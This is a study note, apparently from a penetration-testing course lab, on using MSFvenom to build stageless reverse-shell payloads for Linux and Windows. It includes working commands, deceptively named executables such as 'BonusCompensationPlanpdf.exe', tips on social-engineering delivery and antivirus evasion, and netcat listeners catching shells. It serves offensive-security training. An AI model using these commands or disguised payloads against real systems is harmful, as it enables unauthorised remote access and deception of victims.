# Crafting Payloads with MSFvenom

***

Une méthode consiste à utiliser **MSFvenom**, un outil qui permet de créer des payloads personnalisés que l'on peut envoyer par des moyens comme un email ou des techniques d'ingénierie sociale, incitant ainsi l'utilisateur à exécuter le fichier.

{% hint style="info" %}
**MSFvenom** offre aussi la possibilité de chiffrer et d'encoder les payloads pour contourner les antivirus et autres systèmes de détection de signature malveillante. Cela permet de livrer des payloads de manière plus discrète et efficace.
{% endhint %}

***

### <mark style="color:red;">Practicing with MSFvenom</mark>

In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads.&#x20;

<mark style="color:green;">**List Payloads**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -l payloads
```
{% endcode %}

***

### <mark style="color:red;">Staged vs. Stageless Payloads</mark>

#### <mark style="color:green;">Payloads avec étapes (Staged)</mark>

* Les **payloads staged** fonctionnent en deux étapes : un **stager** (petit code initial) puis le **stage** (le reste du payload téléchargé/exécuté).
* Le stager établit la connexion initiale vers l’attaquant (par ex. pour `linux/x86/shell/reverse_tcp`), puis récupère et lance le stage qui ouvre la reverse shell.
* Avantage : le stager est petit — utile sur des systèmes avec peu de mémoire ou contraintes d’espace.
* Inconvénient : dépendance au réseau et à la stabilité — si le téléchargement échoue ou la mémoire manque, l’attaque peut devenir instable.

#### <mark style="color:green;">Payloads sans étapes (Stageless)</mark>

* Les **payloads stageless** envoient **tout le code d’un coup** et s’exécutent immédiatement sur la cible — pas de stager ni de téléchargement supplémentaire.
* Avantages : plus **stables** sur des réseaux lents/latents (pas de dépendance à plusieurs étapes) et **moins de trafic réseau** observable, ce qui peut aider à l’évasion.
* Inconvénients : le payload complet peut être plus volumineux et nécessiter plus de mémoire pendant l’exécution.
* Choix pratique : dans des environnements à faible bande passante ou à latence élevée, un **stageless** est souvent préférable ; dans d’autres cas le staged peut réduire la taille initiale envoyée.

#### <mark style="color:green;">Comment identifier un payload staged ou stageless ?</mark>

Dans Metasploit, le nom du payload peut souvent indiquer s'il est staged ou stageless. Par exemple :

* `windows/meterpreter/reverse_tcp` est un **payload staged**. On peut le voir car le nom est divisé en plusieurs parties (ou "étapes") par des barres obliques (`/`).
* `windows/meterpreter_reverse_tcp` est un **payload stageless**, car tout est réuni en une seule partie.

En résumé :

* **Staged** : envoie un petit morceau qui télécharge le reste plus tard.
* **Stageless** : envoie tout d'un coup.

Les **payloads stageless** sont plus simples et peuvent être utiles quand les conditions réseau sont mauvaises, tandis que les **payloads staged** sont parfois préférables pour contourner des restrictions sur la taille des fichiers ou la mémoire.

***

### <mark style="color:red;">Building A Stageless Payload</mark>

<mark style="color:green;">**Build It**</mark>

{% code fullWidth="true" %}
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
{% endcode %}

<mark style="color:green;">**Call MSFvenom**</mark>

```shell-session
msfvenom
```

Defines the tool used to make the payload.

<mark style="color:green;">**Creating a Payload**</mark>

```shell-session
-p 
```

This `option` indicates that msfvenom is creating a payload.

<mark style="color:green;">**Choosing the Payload based on Architecture**</mark>

```shell-session
linux/x64/shell_reverse_tcp 
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

<mark style="color:green;">**Address To Connect Back To**</mark>

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

<mark style="color:green;">**Format To Generate Payload In**</mark>

```shell-session
-f elf 
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

**Output**

```shell-session
> createbackup.elf
```

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

***

### <mark style="color:red;">Executing a Stageless Payload</mark>

* Email message with the file attached.
* Download link on a website.
* Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
* Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

**Ubuntu Payload**

![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)

We would have a listener ready to catch the connection on the attack box side upon successful execution.

<mark style="color:green;">**NC Connection**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443
```

When the file is executed, we see that we have caught a shell.

<mark style="color:green;">**Connection Established**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
--------------------------------
```

This same concept can be used to create payloads for various platforms, including Windows.

***

### <mark style="color:red;">Building a simple Stageless Payload for a Windows system</mark>

<mark style="color:green;">**Windows Payload**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
{% endcode %}

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

***

### <mark style="color:red;">Executing a Simple Stageless Payload On a Windows System</mark>

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
```
